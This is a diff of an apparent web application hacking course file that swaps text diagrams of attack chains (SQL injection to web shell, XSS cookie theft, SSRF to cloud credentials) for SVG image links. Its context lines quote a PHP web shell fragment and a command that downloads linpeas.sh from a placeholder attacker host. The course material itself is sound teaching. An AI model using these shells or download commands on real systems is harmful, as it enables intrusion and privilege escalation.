@@ -254,34 +254,7 @@ if(isset($_REQUEST['cmd'])){
 
 ## Chaining Vulnerabilities
 
-```diagram
-Real-world exploitation often chains multiple lower-severity
-vulnerabilities into a critical attack:
-
-Chain 1: Information Disclosure -> Account Takeover
-  1. Directory listing reveals backup.sql
-  2. backup.sql contains password hashes
-  3. Crack hashes -> admin credentials
-  4. Login as admin
-
-Chain 2: XSS -> Session Hijack -> Admin Access
-  1. Stored XSS in user profile
-  2. Admin views profile, cookie stolen
-  3. Use admin cookie to access admin panel
-  4. Upload malicious plugin for RCE
-
-Chain 3: SSRF -> Cloud Metadata -> Full Compromise
-  1. SSRF in image fetcher
-  2. Access AWS metadata endpoint
-  3. Steal IAM credentials
-  4. Access S3 buckets, EC2 instances
-
-Chain 4: SQL Injection -> File Read -> RCE
-  1. SQLi to read /etc/passwd (LOAD_FILE)
-  2. Identify web root from configuration
-  3. SQLi to write web shell (INTO OUTFILE)
-  4. Execute commands via web shell
-```
+![chaining_vulnerabilities](svg/courses/security/web-application-hacking/19_testing_for_injections/chaining_vulnerabilities.svg)
 
 ---
 
@@ -355,34 +328,7 @@ php -r "file_put_contents('linpeas.sh', file_get_contents('http://ATTACKER/linpe
 
 ## Common Exploitation Patterns
 
-```diagram
-Pattern 1: Credentials -> SSH Access
-  1. Find SQL injection
-  2. Dump user credentials from database
-  3. Crack password hashes
-  4. Try credentials on SSH/FTP
-  5. Login with valid creds -> shell
-
-Pattern 2: File Upload -> Web Shell
-  1. Find file upload with weak validation
-  2. Upload PHP/JSP/ASPX web shell
-  3. Access web shell URL
-  4. Execute commands -> reverse shell
-
-Pattern 3: LFI -> Source Code -> Creds -> Access
-  1. Find LFI vulnerability
-  2. Read application config files
-  3. Extract database credentials
-  4. Connect to database directly
-  5. Dump data / modify records
-
-Pattern 4: XSS -> Admin Cookie -> Admin Access
-  1. Find stored XSS
-  2. Inject cookie-stealing payload
-  3. Wait for admin to trigger XSS
-  4. Use admin cookie to access admin panel
-  5. Find admin functionality for RCE
-```
+![common_exploitation_patterns](svg/courses/security/web-application-hacking/19_testing_for_injections/common_exploitation_patterns.svg)
 
 ---
 
